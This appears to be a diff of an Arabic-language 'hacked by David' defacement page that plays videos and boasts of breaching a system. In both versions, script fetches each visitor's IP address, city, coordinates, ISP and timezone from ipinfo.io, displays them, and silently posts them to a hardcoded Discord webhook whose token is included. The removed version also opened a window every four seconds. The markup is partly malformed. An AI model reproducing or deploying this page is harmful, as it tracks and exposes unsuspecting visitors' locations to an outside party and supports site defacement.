@@ -1,194 +1,153 @@
-<!DOCTYPE html>
-<html>
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>https://discord.gg/qxcNVYqtqF</title>
-        <style>
-            body {
-                margin: 0;
-                padding: 0;
-                font-family: 'Courier New', Courier, monospace;
-                color: #490a0a;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                height: 100vh;
-                flex-direction: column;
-                text-align: center;
-                overflow: hidden;
-                background-color: black;
-                /* لون الخلفية الأسود */
-            }
+<!-- saved from url=(0070)http://www.234wed.com/attached/file/20241118/20241118043043_68676.html -->
+<<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>david</title>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        font-family: 'Courier New', Courier, monospace;
+        color: #490a0a;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        flex-direction: column;
+        text-align: center;
+        overflow: hidden;
+        background-color: black;
+        /* لون الخلفية الأسود */
+    }
 
-            /* صفحة الفيديو الأول */
-            .background-video {
-                position: absolute;
-                top: 50%;
-                /* جعل الفيديو في منتصف الصفحة */
-                left: 50%;
-                width: 70%;
-                /* التحكم في عرض الفيديو */
-                height: auto;
-                /* الاحتفاظ بنسبة العرض إلى الارتفاع */
-                transform: translate(-50%, -50%);
-                /* لضمان أن الفيديو يظهر في المركز */
-                z-index: -1;
-                object-fit: contain;
-                /* التحكم في كيفية عرض محتوى الفيديو */
-            }
+    /* صفحة الفيديو الأول */
+    .background-video {
+        position: absolute;
+        top: 50%;
+        /* جعل الفيديو في منتصف الصفحة */
+        left: 50%;
+        width: 70%;
+        /* التحكم في عرض الفيديو */
+        height: auto;
+        /* الاحتفاظ بنسبة العرض إلى الارتفاع */
+        transform: translate(-50%, -50%);
+        /* لضمان أن الفيديو يظهر في المركز */
+        z-index: -1;
+        object-fit: contain;
+        /* التحكم في كيفية عرض محتوى الفيديو */
+    }
 
-            /* نص فوق الفيديو الأول */
-            .video-text {
-                position: absolute;
-                top: 50%;
-                left: 50%;
-                transform: translate(-50%, -50%);
-                font-size: 2em;
-                color: rgb(255, 0, 0);
-                text-shadow: 0px 0px 8px rgb(255, 0, 0), 0px 0px 15px rgb(236, 0, 0), 0px 0px 25px rgb(255, 0, 0);
-                letter-spacing: 2px;
-                animation: blink 1.5s infinite alternate;
-                z-index: 1;
-            }
+    /* صفحة المحتوى الثاني */
+    .content {
+        display: none;
+        /* إخفاء المحتوى الثاني في البداية */
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        z-index: 1;
+        position: relative;
+        height: 100vh;
+        width: 100%;
+    }
 
-            /* تأثير الوميض */
-            @keyframes blink {
-                0% {
-                    opacity: 1;
-                }
+    /* الخلفية الثانية (فيديو في الصفحة الثانية) */
+    .background-video-second {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        z-index: -1;
+    }
 
-                100% {
-                    opacity: 0.2;
-                }
-            }
+    .info {
+        margin-top: 20px;
+        font-size: 1.5em;
+        background: linear-gradient(45deg, white, silver, gold);
+        -webkit-background-clip: text;
+        color: transparent;
+        /* النص سيكون شفافًا لأن التدرج هو الذي سيظهر */
+        text-shadow: 0px 0px 8px rgba(255, 255, 255, 0.5), 0px 0px 15px rgba(255, 255, 255, 0.5), 0px 0px 25px rgba(255, 255, 255, 0.5);
+        letter-spacing: 4.5px;
+        white-space: pre-wrap;
+    }
 
-            /* صفحة المحتوى الثاني */
-            .content {
-                display: none;
-                /* إخفاء المحتوى الثاني في البداية */
-                flex-direction: column;
-                justify-content: center;
-                align-items: center;
-                z-index: 1;
-                position: relative;
-                height: 100vh;
-                width: 100%;
-            }
+    .text {
+        margin-top: 20px;
+        font-size: 3em;
+        background: linear-gradient(45deg, white, silver, gold);
+        -webkit-background-clip: text;
+        color: transparent;
+        /* النص سيكون شفافًا لأن التدرج هو الذي سيظهر */
+        text-shadow: 0px 0px 8px rgba(255, 255, 255, 0.5), 0px 0px 15px rgba(255, 255, 255, 0.5), 0px 0px 25px rgba(255, 255, 255, 0.5);
+        letter-spacing: 4.5px;
+    }
 
-            /* الخلفية الثانية (فيديو في الصفحة الثانية) */
-            .background-video-second {
-                position: absolute;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                object-fit: cover;
-                z-index: -1;
-            }
+    .marquee {
+        position: absolute;
+        top: 10%;
+        width: 100%;
+        overflow: hidden;
+        white-space: nowrap;
+    }
 
-            /* صورة بدون تأثيرات */
-            .image-container img {
-                max-width: 80%;
-                /* تحدد الحد الأقصى لحجم الصورة */
-                height: auto;
-                /* لحفاظ الصورة على النسب */
-                margin: 20px auto;
-                /* يضع الصورة في الوسط أفقيًا */
-                display: block;
-                /* ضمان أن الصورة ستكون في منتصف الصفحة */
-            }
+    .marquee span {
+        display: inline-block;
+        font-size: 2em;
+        color: #ff0000;
+        text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000;
+        animation: scroll 10s linear infinite;
+    }
 
-            /* نص "discord.gg/d-7H" */
-            .text {
-                margin-top: 20px;
-                font-size: 3em;
-                background: linear-gradient(45deg, rgb(255, 0, 0), rgb(255, 0, 0), rgb(255, 0, 0));
-                -webkit-background-clip: text;
-                color: transparent;
-                /* النص سيكون شفافًا لأن التدرج هو الذي سيظهر */
-                text-shadow: 0px 0px 8px rgba(255, 0, 0, 0.5), 0px 0px 15px rgba(255, 0, 0, 0.5), 0px 0px 25px rgba(255, 0, 0, 0.5);
-                letter-spacing: 4.5px;
-            }
+    @keyframes scroll {
+        0% {
+            transform: translateX(100%);
+        }
 
-            /* معلومات الIP */
-            .info {
-                margin-top: 20px;
-                font-size: 1.5em;
-                background: linear-gradient(45deg, rgb(255, 0, 0), rgb(255, 0, 0), rgb(255, 0, 0));
-                -webkit-background-clip: text;
-                color: transparent;
-                /* النص سيكون شفافًا لأن التدرج هو الذي سيظهر */
-                text-shadow: 0px 0px 8px rgba(255, 0, 0, 0.5), 0px 0px 15px rgba(255, 0, 0, 0.5), 0px 0px 25px rgba(255, 0, 0, 0.5);
-                letter-spacing: 4.5px;
-                white-space: pre-wrap;
-            }
+        100% {
+            transform: translateX(-100%);
+        }
+    }
 
-            /* شريط النص المتحرك داخل الفيديو الثاني */
-            .marquee-container {
-                position: relative;
-                width: 100%;
-                margin-top: 20px;
-                overflow: hidden;
-            }
+    /* تعديل لتكبير الصورة وضمان وضعها في المركز */
+    .image-container img {
+        max-width: 80%;
+        /* تحدد الحد الأقصى لحجم الصورة */
+        height: auto;
+        /* لحفاظ الصورة على النسب */
+        margin: 20px auto;
+        /* يضع الصورة في الوسط أفقيًا */
+        display: block;
+        /* ضمان أن الصورة ستكون في منتصف الصفحة */
+    }
+</style>
+</head>
+<body>
+    <!-- الفيديو الذي يتم تشغيله في البداية -->
+    <video class="background-video" autoplay muted>
+        <source src="https://j.top4top.io/m_3260pjgnd1.mp4" type="video/mp4">Your browser does not support the video tag.
 
-            .marquee {
-                white-space: nowrap;
-                overflow: hidden;
-            }
-
-            .marquee span {
-                display: inline-block;
-                font-size: 2em;
-                color: #ff0000;
-                text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000;
-                animation: scroll 10s linear infinite;
-            }
-
-            @keyframes scroll {
-                0% {
-                    transform: translateX(100%);
-                }
-
-                100% {
-                    transform: translateX(-100%);
-                }
-            }
-        </style>
-    </head>
-    <body>
-        <!-- الفيديو الأول -->
-        <video class="background-video" autoplay muted>
-            <source src="3354ycgwh1.mp4" type="video/mp4">Your browser does not support the video tag.
-
-        </video>
-        <!-- نص فوق الفيديو الأول -->
-        <div class="video-text">العم ابو الديفيد </div>
-        <!-- محتوى الصفحة الثانية -->
-        <div class="content">
-            <video class="background-video-second" autoplay loop muted>
-                <source src="vid.mp4" type="video/mp4">Your browser does not support the video tag.
+    </video>
+    <!-- محتوى الصفحة الثانية -->
+    <div class="content">
+        <!-- الفيديو الذي سيكون خلفية الصفحة الثانية -->
+        <video class="background-video-second" autoplay loop muted>
+            <source src="https://i.top4top.io/m_3243zidf01.mov" type="video/mp4">Your browser does not support the video tag.
     
-            </video>
-            <!-- صورة بدون تأثيرات -->
+        </video>
+        <!-- شريط النص المتحرك -->
+        <div class="marquee"></div>
+        <!-- صورة أعلى النصوص -->
+        <div id="content">
             <div class="image-container">
-                <img src="" alt="">
+                <img src="https://david-web-storage.s3.eu-north-1.amazonaws.com/lol.gif" alt="">
             </div>
-            <!-- نص "https://discord.gg/qxcNVYqtqF" -->
-            <div class="text">https://discord.gg/qxcNVYqtqF</div>
-            <!-- معلومات الIP مع البورت -->
+            <!-- معلومات الفيديو والنصوص -->
             <div class="info" id="ip-info">Loading IP Info...</div>
-            <!-- شريط النص المتحرك داخل الفيديو الثاني -->
-            <div class="marquee-container">
-                <div class="marquee">
-                    <span>inst z9ddr - العم ابو الديفد - https://discord.gg/qxcNVYqtqF
-
-            </span>
-                </div>
-            </div>
-            <!-- الصوت في الخلفية -->
-            <audio id="background-audio" loop>
-                <source src="lol.mp3" type="audio/mp3">Your browser does not support the audio element.
+            <div class="text"> https://discord.gg/qxcNVYqtqF</div>
+            <!-- الصوت -->
+            <audio autoplay loop>
+                <source src="https://david-web-storage.s3.eu-north-1.amazonaws.com/m3243zidf01.mov" type="audio/mpeg">Your browser does not support the audio element.
     
             </audio>
         </div>
@@ -197,59 +156,45 @@
             const video = document.querySelector('.background-video');
             const content = document.querySelector('.content');
 
+            // عند انتهاء الفيديو، عرض المحتوى الثاني	
             video.onended = function() {
                 content.style.display = 'flex';
                 // عرض المحتوى الثاني
                 video.style.display = 'none';
                 // إخفاء الفيديو
-                document.getElementById('background-audio').play().catch( () => console.log("يجب تفعيل الصوت يدويًا"));
             }
             ;
 
             // Fetch IP information without API token
             fetch('https://ipinfo.io/json').then(response => response.json()).then(data => {
                 const {ip, country, city, region, loc, org, timezone} = data;
-
-                // تحديد البورت بناءً على البروتوكول
-                const port = window.location.port || (location.protocol === 'https:' ? '443' : '80');
-
                 const infoDiv = document.getElementById('ip-info');
-                infoDiv.innerHTML = `العم ابو الديفد  &david on top 
-<strong>IP:</strong><span>"${ip}"</span><br>
-<strong>Port:</strong><span style="color: #ffd700">${port}</span><br>
-<strong>City:</strong><span>"${city}"</span><br>
-<strong>Region:</strong><span>"${region}"</span><br>
-<strong>Country:</strong><span>"${country}"</span><br>
-<strong>Location:</strong><span>"${loc}"</span><br>
-<strong>ISP:</strong><span>"${org}"</span><br>
-<strong>Timezone:</strong><span>"${timezone}"</span>`;
+                infoDiv.innerHTML = ` العم ديفد اخترق النظام يا مناوب
+<strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;
 
                 const dateTime = new Date().toLocaleString();
                 const webhookUrl = 'https://discord.com/api/webhooks/1350797439447208062/0oVmJKwviNsMT5_hPdfaW5bJqPqYqYaKhYjowXC6mSrreoRmtAGoSTpCUGt-SgjXUuFG';
-
                 fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        content: `⚠️ **هطف جديد اشتغلت عنده الشاشه ** ⚠️\n\n` + `**IP:** \`${ip}\`\n` + `**Port:** \`${port}\`\n` + `**Location:** ${country} - ${city}\n` + `**Coordinates:** ${loc}\n` + `**ISP:** ${org}\n` + `**Time:** ${dateTime}`
+                        content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`
                     })
                 });
             }
             );
         </script>
-        <!-- فتح نوافذ Discord تلقائيًا -->
-        <script>
-            // الرابط الذي تريد فتحه
-            const linkToOpen = "";
+</body>
+</html></script></body></html></script>
+<marquee>
+    <font size="3">
+        <b></b>
+        "ديفيد - العم ديفد على القمة - ديفيد على القمة # العم ديفد - حماية فاشلة - لا يوجد نظام مكافحة الغش - ديفيد على القمة - العم ديفد هنا؟ - ديفيد الآن في نظامك!"
 
-            // فتح الرابط كل 4 ثانية
-            setInterval( () => {
-                window.open(linkToOpen, '_blank');
-            }
-            , 4000);
-            // 2000 ميلي ثانية = 2 ثانية
-        </script>
-    </body>
-</html>
+
+
+            
+</marquee>
+</div></td></table>
